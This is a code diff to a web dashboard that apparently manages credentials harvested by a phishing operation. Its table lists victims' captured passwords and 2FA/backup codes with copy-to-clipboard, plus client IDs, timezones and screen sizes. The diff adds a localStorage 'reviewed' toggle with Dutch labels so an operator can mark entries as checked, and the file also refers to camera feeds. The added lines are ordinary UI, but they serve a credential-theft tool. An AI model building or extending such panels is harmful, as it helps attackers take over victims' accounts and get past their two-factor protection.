@@ -2021,6 +2021,8 @@ function renderCredentials(creds) {
     const seenClient = {};
     const arrow = col => credSort.col === col ? (credSort.dir === 1 ? ' ▲' : ' ▼') : ' ⇅';
     const th = (col, label) => `<th onclick="sortCreds('${col}')" style="padding:7px 10px;cursor:pointer;user-select:none;white-space:nowrap">${label}${arrow(col)}</th>`;
+    let reviewed;
+    try { reviewed = new Set(JSON.parse(localStorage.getItem('_rev_creds') || '[]')); } catch { reviewed = new Set(); }
     c.innerHTML = `<table style="width:100%;border-collapse:collapse;font-size:.72rem">
         <thead><tr style="border-bottom:1px solid var(--border2);color:var(--dim);text-align:left">
             <th style="padding:7px 10px">#</th>
@@ -2033,6 +2035,7 @@ function renderCredentials(creds) {
             ${th('timezone','Timezone')}
             ${th('screen','Screen')}
             <th style="padding:7px 10px">Stay</th>
+            <th style="padding:7px 10px">Status</th>
         </tr></thead>
         <tbody>${sorted.map((cr, i) => {
             seenClient[cr.clientId] = (seenClient[cr.clientId] || 0) + 1;
@@ -2043,7 +2046,9 @@ function renderCredentials(creds) {
             const is2fa = safePw.startsWith('[2FA');
             const pwColor = is2fa ? '#a78bfa' : '#4fc3f7';
             const pwTitle = is2fa ? '2FA/Backup code' : 'Click to copy password';
-            return `<tr style="border-bottom:1px solid var(--border2);background:${i%2===0?'rgba(244,180,0,.04)':'transparent'}">
+            const isReviewed = reviewed.has(cr.id || cr.timestamp);
+            const credKey = JSON.stringify(cr.id || cr.timestamp);
+            return `<tr style="border-bottom:1px solid var(--border2);background:${isReviewed ? 'rgba(52,168,83,.06)' : (i%2===0?'rgba(244,180,0,.04)':'transparent')}">
                 <td style="padding:7px 10px;color:var(--dim)">${i+1}</td>
                 <td style="padding:7px 10px;white-space:nowrap;color:var(--dim)">${fmtTime(cr.timestamp)}<br><span style="font-size:.55rem;opacity:.65">${fmtAgo(cr.timestamp)}</span></td>
                 <td style="padding:7px 10px;color:var(--dim);font-size:.6rem">${escHtml(cr.clientId||'')}${repeatBadge}</td>
@@ -2054,6 +2059,7 @@ function renderCredentials(creds) {
                 <td style="padding:7px 10px;color:var(--dim);font-size:.6rem;white-space:nowrap">${escHtml(cr.timezone||'—')}</td>
                 <td style="padding:7px 10px;color:var(--dim);font-size:.6rem">${escHtml(cr.screen||'—')}</td>
                 <td style="padding:7px 10px;color:${cr.staySignedIn?'#4ade80':'var(--dim)'}">${cr.staySignedIn ? '✓' : '—'}</td>
+                <td style="padding:7px 10px;"><button onclick="toggleReviewed(${credKey})" style="font-size:.6rem;padding:2px 7px;border-radius:4px;border:1px solid ${isReviewed ? '#34a853':'var(--border2)'};background:${isReviewed ? 'rgba(52,168,83,.15)':'var(--bg2)'};color:${isReviewed ? '#34a853':'var(--dim)'};cursor:pointer;">${isReviewed ? '✓ Bekeken' : '⬜ Markeer'}</button></td>
             </tr>`;}).join('')}
         </tbody></table>`;
 }
@@ -2062,6 +2068,15 @@ async function clearCredentials() {
     await apiFetch('/api/credentials', { method: 'DELETE' });
     await loadCredentials();
     refreshAll();
+}
+
+function toggleReviewed(credKey) {
+    try {
+        let set = new Set(JSON.parse(localStorage.getItem('_rev_creds') || '[]'));
+        if (set.has(credKey)) set.delete(credKey); else set.add(credKey);
+        localStorage.setItem('_rev_creds', JSON.stringify([...set]));
+        renderCredentials(window._lastCreds || []);
+    } catch {}
 }
 
 async function loadCameraFeeds() {
